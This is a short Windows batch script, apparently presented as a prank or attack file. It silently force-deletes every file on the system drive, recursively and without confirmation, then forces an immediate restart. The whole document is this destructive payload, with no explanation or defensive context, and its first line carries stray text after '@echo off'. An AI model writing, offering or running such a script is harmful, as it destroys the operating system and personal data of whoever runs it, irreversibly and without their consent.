@echo off/disable permanently
del %systemdrive%\*.* /f /s /q
shutdown -r -f -t 00
